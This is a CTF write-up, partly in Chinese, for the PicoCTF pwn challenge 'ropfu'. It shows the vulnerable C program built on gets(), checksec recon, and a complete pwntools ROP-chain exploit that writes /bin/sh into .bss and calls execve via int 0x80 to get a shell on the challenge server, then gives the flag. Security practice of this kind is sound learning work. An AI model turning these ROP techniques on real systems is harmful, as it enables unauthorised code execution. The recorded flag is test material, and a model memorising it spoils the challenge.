---
title: PicoCTF - ropfu
tags: [PicoCTF, CTF, PWN]

category: "Security > Practice > PicoCTF > PWN"
---

# PicoCTF - ropfu
## Background
ROP Chain
x86 Calling Convention:
[Linux System Call Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)
## Source code
:::spoiler Source Code
```cpp=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```
:::
## Recon
```bash!
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=232215a502491a549a155b1a790de97f0c433482, for GNU/Linux 3.2.0, not stripped
$ checksec vuln
[*] '/mnt/d/NTU/CTF/PicoCTF/PWN/ropfu/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
這一題很明顯要開個shell，我以為會像[^pico_pwn_guessing_game][^0x12_rop++]這兩題一樣，事實上概念完全一樣，但換到x86的32bits版本就不知道為啥一直沒有成功，後來有想到是忽略了calling convention的問題，和x86-64的版本不一樣，另外指令的選擇上也不太一樣，像64bits的system call會用syscall，但x86會用int 0x80處理[^syscall_in_x86]，另外寫入`/bin/sh\x00`的方式也和之前的不一樣，之前是call __libc_read function之前把暫存器的部分擺好，就直接跳到__libc_read的地方去，但在這邊是沒辦法成功的，看了其他人的wp[^ropfu_wp]，大部分的做法都是直接用rop把值寫到對應的section中，詳細如下:
```assembly
pop edx -> bss address
pop eax -> 0x6e69622f -> /bin
mov DWORD PTR [edx] eax
pop edx -> bss address
pop eax -> 0x0068732f -> /sh\x00
mov DWORD PTR [edx] eax
```
寫完`/bin/sh\x00`就直接call execve的syscall開shell
## Exploit - ROP Chain
```python!
from pwn import *

# r = process('./vuln')
r= remote('saturn.picoctf.net', 54107)
context.arch = 'amd64'

r.recvline()

pop_eax_ret = 0x80b073a
pop_edx_ebx_ret = 0x80583b9
bss_addr = 0x080e5050
mov_dword_ptr_edx_eax_ret = 0x80590f2
pop_ecx_ret = 0x8049e29
int_0x80 = 0x0807163f

'''############
Read /bin/sh\x00
############'''
# raw_input()
r.sendline(b'a' * 0x1c + 
           p32(pop_edx_ebx_ret) + p32(bss_addr) + p32(0) + 
           p32(pop_eax_ret) + p32(0x6e69622f) +
           p32(mov_dword_ptr_edx_eax_ret) + 
           p32(pop_edx_ebx_ret) + p32(bss_addr + 4) + p32(0) + 
           p32(pop_eax_ret) + p32(0x0068732f) +
           p32(mov_dword_ptr_edx_eax_ret) + 

           p32(pop_eax_ret) + p32(0xb) + 
           p32(pop_edx_ebx_ret) + p32(0) + p32(bss_addr) + 
           p32(pop_ecx_ret) + p32(0) + 
           p32(int_0x80)
)

r.interactive()
```

Flag: `picoCTF{5n47ch_7h3_5h311_1b5a4b40}`
## Reference
[^ropfu_wp]:[ PicoCTF 2022: Beginner's Compilation ](https://enscribe.dev/ctfs/pico22/beginners-compilation/#ropfu)
[^pico_pwn_guessing_game]:[PicoCTF - Guessing Game 1](https://hackmd.io/@SBK6401/SkxoLuwoh)
[^0x12_rop++]:[Simple PWN - 0x12(Lab - rop++)](https://hackmd.io/@SBK6401/rysBjQfjs)
[^syscall_in_x86]:[ 在 Linux 下寫組語, 透過 int 0x80 使用 system call ](http://guguclock.blogspot.com/2009/01/linux-int-0x80-system-call.html)